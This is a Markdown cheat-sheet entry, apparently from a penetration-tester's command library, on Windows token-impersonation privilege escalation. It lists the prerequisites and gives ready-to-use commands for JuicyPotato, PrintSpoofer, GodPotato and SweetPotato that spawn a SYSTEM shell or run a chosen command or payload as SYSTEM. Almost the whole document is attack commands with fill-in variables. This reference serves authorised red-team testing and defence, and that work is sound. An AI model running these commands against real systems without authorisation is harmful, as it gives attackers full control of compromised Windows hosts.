---
technique: Token Impersonation
category: privilege-escalation
targets: Windows Service Accounts
protocols: Local, COM, RPC
remote_capable: false
tags: windows lpe token-impersonation seimpersonate potato printspoofer godpotato
---

# Token Impersonation

Service contexts often hold `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`. Potato-family techniques and PrintSpoofer-style paths abuse those privileges to start a process as `NT AUTHORITY\SYSTEM`.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Privilege | `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` must be present and enabled |
| Service context | IIS, SQL Server, service accounts, and scheduled tasks commonly expose the needed privilege |
| Payload path | The command or binary must be reachable from the target host |

## Windows

### Check privileges

#cmd #token

Check whether the current token has impersonation privileges.

```cmd title:"Check token privileges"
whoami /priv
```
<!-- cheat -->

### JuicyPotato command

#cmd #juicypotato

Run a command through JuicyPotato on older supported Windows versions.

```cmd title:"Run command with JuicyPotato"
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c $command" -t *
```
<!-- cheat
var command
-->

### JuicyPotato with CLSID

#cmd #juicypotato

Run JuicyPotato with a specific CLSID when the default path fails.

```cmd title:"Run JuicyPotato with explicit CLSID"
JuicyPotato.exe -l 1337 -p "$payload_path" -t * -c "$clsid"
```
<!-- cheat
var payload_path
var clsid
-->

### PrintSpoofer interactive shell

#cmd #printspoofer

Spawn an interactive SYSTEM command prompt with PrintSpoofer when the Print Spooler path is available.

```cmd title:"Spawn SYSTEM shell with PrintSpoofer"
PrintSpoofer.exe -i -c cmd
```
<!-- cheat -->

### PrintSpoofer command

#cmd #printspoofer

Execute a command with PrintSpoofer.

```cmd title:"Run command with PrintSpoofer"
PrintSpoofer.exe -c "$command"
```
<!-- cheat
var command
-->

### GodPotato command

#cmd #godpotato

Execute a command as SYSTEM with GodPotato on modern Windows targets.

```cmd title:"Run command with GodPotato"
GodPotato.exe -cmd "$command"
```
<!-- cheat
var command
-->

### SweetPotato payload

#cmd #sweetpotato

Execute a payload with SweetPotato.

```cmd title:"Run payload with SweetPotato"
SweetPotato.exe -p "$payload_path"
```
<!-- cheat
var payload_path
-->

## Linux

No Linux operator command is included here. This note covers local Windows token impersonation tooling.
